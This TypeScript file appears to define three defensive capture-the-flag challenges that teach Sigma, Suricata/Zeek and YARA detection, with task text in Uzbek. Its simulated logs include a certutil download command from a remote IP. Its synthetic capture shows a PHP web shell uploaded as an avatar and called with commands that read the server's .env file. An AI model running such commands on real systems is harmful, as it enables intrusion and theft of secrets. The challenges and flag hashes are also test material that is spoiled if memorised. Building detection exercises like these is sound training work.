import type { CtfChallenge } from './types';
import type { SiemEvent } from '../engine/siem/types';
import { strftime } from '../engine/siem/values';
import { Capture, httpGet, httpPost, httpResponse, at } from '../engine/terminal/pcapBuild';
import { prng, utc } from './labs/siem';

/*
 * Detection-tool challenges: Sigma (terminal + SIEM), Suricata/Zeek on a capture, YARA with hex strings.
 * Flags are stored as hashes; plain answers and the scripted solutions live in content.test.ts.
 */

const W = String.raw;

/* ── Sigma: a rule that is too loose ─────────────────────────────────── */

function certutilData(): SiemEvent[] {
  const rnd = prng(1607);
  const out: SiemEvent[] = [];
  const SYSMON = 'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational';
  const add = (t: number, host: string, cmd: string, parent: string) =>
    out.push({ _time: t, _raw: `${strftime(t, '%Y-%m-%dT%H:%M:%SZ')} EventID=1 Computer=${host} Image=C:\\Windows\\System32\\certutil.exe CommandLine=${cmd}`, index: 'sysmon', sourcetype: SYSMON, host, source: SYSMON, EventCode: 1, EventID: 1, Image: 'C:\\Windows\\System32\\certutil.exe', ParentImage: parent, CommandLine: cmd });
  const t0 = utc('2026-11-18T03:00:00Z');
  // Administrators use certutil every day: checking certificates, dumping files, decoding.
  const admin: [string, string][] = [
    ['WS-IT-002', 'certutil.exe -verify -urlfetch C:\\certs\\proxy.cer'],
    ['WS-IT-002', 'certutil.exe -f -dump C:\\certs\\root.cer'],
    ['SRV-PKI-01', 'certutil.exe -f -repairstore my 3a1b'],
    ['SRV-PKI-01', 'certutil.exe -crl'],
    ['WS-IT-004', 'certutil.exe -hashfile C:\\Tools\\setup.msi SHA256'],
    ['WS-IT-004', 'certutil.exe -f -decode C:\\Temp\\license.b64 C:\\Temp\\license.txt'],
  ];
  for (let i = 0; i < 24; i++) {
    const [host, cmd] = admin[i % admin.length]!;
    add(t0 + Math.floor(rnd() * 8 * 3600), host, cmd, 'C:\\Windows\\System32\\cmd.exe');
  }
  // One download with the "-urlcache -split -f" pattern, from a mail-opened script on an HR workstation.
  add(utc('2026-11-18T06:47:12Z'), 'WS-HR-005', 'certutil.exe -urlcache -split -f http://198.51.100.88/a.txt C:\\Users\\Public\\a.txt', 'C:\\Windows\\System32\\wscript.exe');
  return out;
}

const CERTUTIL_RULE = W`title: certutil bilan fayl yuklab olish
id: 7e0a4c19-2d8b-4f53-a6e1-9c3b5d7f0a24
status: experimental
description: certutil -urlcache -f bilan internetdan fayl yuklab olinmoqda (LOLBin)
author: SOC jamoasi
date: 2026/11/18
level: high
tags:
  - attack.command-and-control
  - attack.t1105
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\certutil.exe'
    CommandLine|contains:
      - '-urlcache'
      - '-f'
  condition: selection
`;

/* ── Suricata / Zeek: a web shell in the DMZ ─────────────────────────── */

function dmzCapture(): string {
  const c = new Capture();
  const SRV = '203.0.113.20';
  const ok = (body: string) => httpResponse(200, 'OK', body);
  const visitors = ['192.0.2.14', '192.0.2.31', '192.0.2.20', '192.0.2.47'];
  let k = 0;
  for (let i = 0; i < 18; i++) {
    const ip = visitors[i % visitors.length]!;
    const path = ['/', '/notes', '/notes/1042', '/static/app.css', '/uploads/avatar_1043.png', '/profile'][i % 6]!;
    c.tcp(at(10, 0, i * 25), ip, 51000 + k++, SRV, 80, [{ c: httpGet('qaydnoma.example.com', path), s: ok('<html>Qaydnoma</html>') }]);
  }
  // Ordinary avatar uploads, and one that is not an image.
  c.tcp(at(10, 2), '192.0.2.31', 51500, SRV, 80, [{ c: httpPost('qaydnoma.example.com', '/profile/avatar', 'filename=avatar_1043.png&data=iVBORw0KGgo='), s: ok('{"ok":true}') }]);
  c.tcp(at(10, 6), '198.51.100.140', 51600, SRV, 80, [{ c: httpPost('qaydnoma.example.com', '/profile/avatar', 'filename=avatar_5512.php&data=PD9waHAgLyogdGVzdCAqLyA/Pg=='), s: ok('{"ok":true}') }]);
  // Then the uploaded file is called with commands in the query string.
  ['id', 'uname+-a', 'ls+-la+/srv/qaydnoma', 'cat+/srv/qaydnoma/.env'].forEach((cmd, i) =>
    c.tcp(at(10, 7, i * 20), '198.51.100.140', 51700 + i, SRV, 80, [{ c: httpGet('qaydnoma.example.com', `/uploads/avatar_5512.php?c=${cmd}`, 'curl/8.4.0'), s: ok('...') }]),
  );
  return c.build();
}

/* ── YARA: the newest config version ─────────────────────────────────── */

function sampleFiles(): Record<string, string> {
  const rnd = prng(307);
  const junk = (n: number) => Array.from({ length: n }, () => String.fromCharCode(Math.floor(rnd() * 256))).join('');
  const peHead = 'MZ\x90\x00\x03\x00\x00\x00' + '\x00'.repeat(52) + '\x80\x00\x00\x00' + 'This program cannot be run in DOS mode.\r\r\n$';
  // The family keeps its config after the marker "CFG!": a 2-byte version (little-endian), then 00 00.
  const withCfg = (major: number, minor: number) => peHead + junk(120) + 'CFG!' + String.fromCharCode(minor, major) + '\x00\x00' + junk(60);
  return {
    'invoice_scan.bin': withCfg(3, 1),
    'driver_update.bin': withCfg(3, 5),
    'report_q3.bin': withCfg(3, 7),
    'chrome_patch.bin': withCfg(3, 2),
    'tool_helper.bin': withCfg(7, 3),
    'notepad.bin': peHead + junk(200),
    'readme.txt': 'CFG! marker documentation draft. Version 0307 planned.\n',
    'backup.bin': peHead + junk(80) + 'CFG?' + '\x07\x03\x00\x00' + junk(40),
  };
}

export const CTF_DETECT: CtfChallenge[] = [
  {
    id: 'det-sigma',
    title: "Juda bo'sh qoida",
    category: 'loglar',
    level: 3,
    description:
      "`~/rules/certutil_download.yml` — certutil orqali fayl yuklab olishni aniqlaydigan Sigma qoidasi. Uni o'girib SIEM'da ishga tushirsangiz, administratorlarning har kungi ishi ham chiqadi: qoidada mantiqiy xato bor. Uni tuzating, qayta o'giring va SIEM'da (`index=sysmon`) sinang.\n\n" +
      "Flag: `flag{qurilma_nomi}` — haqiqiy yuklab olish bo'lgan qurilma (masalan `flag{ws-it-002}`).",
    hints: [
      "`sigma convert -t splunk -p sysmon rules/certutil_download.yml` — ro'yxatdagi qiymatlar OR bilan bog'lanadi: `-f` deyarli hamma certutil buyrug'ida bor.",
      "Sigma'da ro'yxatning hamma qiymati bo'lishi kerak bo'lsa, modifikatorga `|all` qo'shiladi: `CommandLine|contains|all:`. `sed -i` bilan tuzating.",
    ],
    flagHash: '12a791054efe7e',
    panes: ['terminal', 'siem'],
    shell: () => ({ fs: { home: { talaba: { rules: { 'certutil_download.yml': CERTUTIL_RULE } } }, tmp: {} }, siem: { now: '2026-11-18T12:00:00Z', indexes: { sysmon: certutilData() } } }),
  },
  {
    id: 'det-webshell',
    title: 'Avatar emas',
    category: 'tarmoq',
    level: 2,
    description:
      "Qaydnoma'ning DMZ sensori 10:00–10:10 trafikini `~/sensor/dmz.pcap` ga yozgan. Kimdir profil rasmi o'rniga server tomonida ishlaydigan fayl yuklagan va uni buyruqlar bilan chaqirgan (**web shell**). Zeek loglari yoki o'zingiz yozgan Suricata qoidasi bilan toping.\n\n" +
      "Flag: `flag{yo'l}` — web shell faylining URI yo'li, so'rov parametrlarisiz (masalan `flag{/static/x.js}`).",
    hints: [
      "`zeek -r dmz.pcap`, keyin `cat http.log | zeek-cut id.orig_h method uri user_agent` — `/uploads/` ichidagi qaysi fayl `.png` emas?",
      'Suricata usuli: `alert http any any -> any any (msg:"web shell"; http.uri; content:"/uploads/"; content:".php"; sid:1000100;)` ni `rules/local.rules` ga yozib, `suricata -r dmz.pcap -S rules/local.rules -l out`.',
    ],
    flagHash: '1a0fc56129b6c3',
    shell: () => ({ host: 'sensor01', fs: { home: { talaba: { sensor: { 'dmz.pcap': dmzCapture(), rules: { 'local.rules': '# DMZ qoidalari\n' }, out: {} } } }, tmp: {} }, cwd: '/home/talaba/sensor' }),
  },
  {
    id: 'det-yara-hex',
    title: 'Eng yangi versiya',
    category: 'forensics',
    level: 3,
    description:
      "`/srv/samples/` da bir oilaga mansub bo'lishi mumkin bo'lgan fayllar. Tahlilchi yozuvi: \"Oila sozlamalarini `CFG!` belgisidan keyin saqlaydi: 2 bayt versiya (**little-endian**), keyin `00 00`. Bizni **3.7** versiya qiziqtiradi.\" Hex satrli YARA qoidasi yozing va shu versiyali **PE** faylni toping.\n\n" +
      "Flag: `flag{fayl_nomi}` (masalan `flag{notepad.bin}`).",
    hints: [
      "`CFG!` baytlari: 43 46 47 21. Versiya 3.7 = 0x0307; little-endian'da kichik bayt oldin: `07 03`.",
      "`echo 'rule Cfg37 { strings: $c = { 43 46 47 21 07 03 00 00 } condition: uint16(0) == 0x5A4D and $c }' > v.yar`, keyin `yara v.yar /srv/samples`. Teskari tartib (03 07) boshqa versiyani topadi.",
    ],
    flagHash: '07bb76f6dea8bc',
    shell: () => ({ fs: { home: { talaba: {} }, srv: { samples: sampleFiles() }, tmp: {} } }),
  },
];
